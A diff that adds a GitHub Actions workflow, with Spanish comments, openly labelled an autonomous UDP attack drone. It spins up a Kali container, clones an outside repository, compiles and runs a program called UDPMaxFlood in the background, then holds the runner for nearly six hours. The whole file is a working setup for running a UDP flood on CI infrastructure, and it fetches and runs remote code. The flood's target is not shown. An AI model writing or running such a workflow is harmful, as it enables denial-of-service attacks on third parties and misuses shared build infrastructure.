@@ -1,0 +1,32 @@
+name: Dron de Ataque UDP Autónomo
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Lanzar Dron y Ejecutar Misión
+        run: |
+          echo "### Creando contenedor Kali..."
+          docker run --rm -d --name kali kalilinux/kali-rolling tail -f /dev/null
+
+          echo "### Instalando armamento mínimo (git y jdk)..."
+          docker exec kali apt-get update
+          docker exec kali apt-get install -yq git default-jdk
+
+          echo "### ¡INICIANDO SECUENCIA DE ATAQUE EN SEGUNDO PLANO!"
+          # Usamos 'docker exec -d' para que la misión se ejecute en segundo plano
+          # y el script pueda continuar al siguiente paso (el sleep).
+          # Toda la secuencia está encadenada con '&&' para asegurar el orden.
+          docker exec -d kali bash -c \
+            "git clone https://github.com/feloxgarcia0-stack/UDP2.git /root/attack && \
+             cd /root/attack && \
+             javac UDPMaxFlood.java && \
+             java UDPMaxFlood"
+
+          echo "### Misión en curso. El dron está activo."
+      
+      - name: Mantener Activo el Dron (Casi 6 Horas)
+        run: sleep 21000
